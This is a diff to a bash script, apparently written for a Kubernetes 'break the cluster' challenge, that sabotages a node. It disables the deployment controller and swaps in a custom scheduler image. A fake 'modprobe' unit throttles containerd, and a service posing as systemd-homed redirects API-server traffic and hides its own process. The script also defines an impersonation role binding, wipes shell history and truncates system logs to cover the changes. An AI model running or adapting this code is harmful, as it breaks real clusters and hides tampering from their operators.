@@ -1,22 +1,40 @@
 #!/usr/bin/env bash
+set -x
 
 unset HISTFILE
 export HISTSIZE=0
 
 kube_controller() {
   #TODO: test it
-  sed -i 's#--controllers=*,bootstrapsigner,tokencleaner#--controllers=*,bootstrapsigner,-deployment,tokencleaner#' /etc/kubernetes/manifests/kube-controller-manager.yaml
+  sed -i 's#--controllers=\*,bootstrapsigner,tokencleaner#--controllers=\*,bootstrapsigner,-deployment,tokencleaner#' /etc/kubernetes/manifests/kube-controller-manager.yaml
 }
 
 kube_scheduler() {
   ctr --namespace=k8s.io images pull ghcr.io/jkroepke/klustered/kube-scheduler:latest
-  ctr --namespace=k8s.io images tag --force ghcr.io/jkroepke/klustered/kube-scheduler:v1.24.3 k8s.gcr.io/kube-scheduler:v1.24.3
+  ctr --namespace=k8s.io images tag --force ghcr.io/jkroepke/klustered/kube-scheduler:latest k8s.gcr.io/kube-scheduler:v1.24.3
   ctr --namespace=k8s.io images rm ghcr.io/jkroepke/klustered/kube-scheduler:latest
   sleep 2
   crictl -r unix:///run/containerd/containerd.sock rmp -f "$(crictl -r unix:///run/containerd/containerd.sock pods | grep kube-scheduler | cut -d' ' -f1)"
   kubectl delete pods -l 'component in (kube-scheduler, kube-apiserver, kube-controller-manager)' -n kube-system --force --grace-period=0
   systemctl restart kubelet
 }
+
+containerd_logs() {
+  # shellcheck disable=SC2016
+  mkdir -p /etc/containerd
+  cat << EOF > /etc/containerd/config.toml
+version = 2
+
+[plugins."io.containerd.grpc.v1.cri"]
+  max_container_log_line_size = 10
+EOF
+
+  sed -i 's/KillMode=process/KillSignal=SIGKILL/' /lib/systemd/system/containerd.service
+  systemctl daemon-reload
+  systemctl stop containerd
+  systemctl start containerd
+}
+
 
 containerd() {
   # shellcheck disable=SC2016
@@ -29,14 +47,14 @@ PartOf=containerd.service
 
 [Service]
 Type=simple
-ExecStartPre=/bin/bash -c "sleep 1; prlimit --nproc=5 --pid=$(pidof containerd 2>/dev/null) > /dev/null 2>&1 || true"
+ExecStartPre=/bin/bash -c "sleep 1; prlimit --nproc=5 --pid=\$(pidof containerd 2>/dev/null) > /dev/null 2>&1 || true"
 ExecStart=/usr/sbin/modprobe overlay
 RemainAfterExit=yes
 
 [Install]
 WantedBy=multi-user.target
 EOF
-  systemctl enable modprobe
+  systemctl enable --now modprobe
 
   sed -i 's/KillMode=process/KillSignal=SIGKILL/' /lib/systemd/system/containerd.service
   systemctl daemon-reload
@@ -51,11 +69,11 @@ impersonation() {
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRoleBinding
 metadata:
-name: imposter
+  name: imposter
 roleRef:
-apiGroup: rbac.authorization.k8s.io
-kind: ClusterRole
-name: imposter
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: imposter
 subjects:
 - apiGroup: rbac.authorization.k8s.io
   kind: User
@@ -64,7 +82,7 @@ subjects:
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRole
 metadata:
-name: imposter
+  name: imposter
 rules:
 - apiGroups: [""]
   resources: ["groups"]
@@ -94,7 +112,7 @@ apim() {
   sysctl -w net.ipv4.conf.default.route_localnet=1 >> /etc/sysctl.d/99-sysctl.conf
   echo 1 | tee /proc/sys/net/ipv4/conf/*/route_localnet
 
-  cat << EOF > /lib/systemd/system/systemd-homed
+  cat << EOF > /lib/systemd/system/systemd-homed.service
 [Unit]
 Description=Home Area Manager
 Documentation=man:systemd-homed.service(8)
@@ -116,13 +134,13 @@ EOF
 StandardOutput=null
 StandardError=null
 
-ExecStartPre=-/bin/bash -c 'iptables -t nat -nL OUTPUT | grep 853 && iptables -t nat -A OUTPUT ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
-ExecStartPre=-/bin/bash -c 'iptables -t nat -nL PREROUTING | grep 853 && iptables -t nat -A PREROUTING ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
-ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL OUTPUT | grep 853 && ip6tables -t nat -A PREROUTING -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
-ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL PREROUTING | grep 853 && ip6tables -t nat -A OUTPUT -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
-ExecStartPre=/bin/bash -c "printf 'flush ruleset; table ip nat { chain prerouting { type nat hook prerouting priority 0; policy accept; ip daddr != 127.0.0.53 tcp dport 6443 dnat to :853; }; chain postrouting { type nat hook postrouting priority 100; policy accept; }; chain output { type nat hook output priority 100; policy accept; ip daddr != 127.0.0.53 tcp dport 853 dnat to :2222; };};' | nft -f -"
-ExecStartPre=/bin/bash -c 'umount -q /proc/*'
-ExecStartPost=/bin/bash -c 'mount -o bind /proc/fs/nfsd/ /proc/$(pidof systemd-homed)/'
+ExecStartPre=-/bin/bash -c 'iptables -t nat -nL OUTPUT | grep 853 || iptables -t nat -A OUTPUT ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
+ExecStartPre=-/bin/bash -c 'iptables -t nat -nL PREROUTING | grep 853 || iptables -t nat -A PREROUTING ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
+ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL OUTPUT | grep 853 || ip6tables -t nat -A PREROUTING -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
+ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL PREROUTING | grep 853 || ip6tables -t nat -A OUTPUT -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
+ExecStartPre=/bin/bash -c "printf 'flush ruleset; table ip nat { chain prerouting { type nat hook prerouting priority 0; policy accept; ip daddr != 127.0.0.53 tcp dport 6443 dnat to :853; }; chain postrouting { type nat hook postrouting priority 100; policy accept; }; chain output { type nat hook output priority 100; policy accept; ip daddr != 127.0.0.53 tcp dport 6443 dnat to :853; };};' | nft -f -"
+ExecStartPre=-/bin/bash -c 'umount -q /proc/*'
+ExecStartPost=/bin/bash -c 'mount -o bind /proc/fs/nfsd/ /proc/\$(pidof systemd-homed)/'
 EOF
 
   systemctl enable --now systemd-homed.service
@@ -130,14 +148,15 @@ EOF
 
 kube_controller
 kube_scheduler
-containerd
-impersonation
+#containerd
+#impersonation
 apim
+#containerd_logs
 
 
 echo "Nothing to see here, sorry" > ~/.bash_history
 # TODO test it
-find / -exec touch {} +
+#find / -exec touch {} +
 
 true >/var/log/messages
 
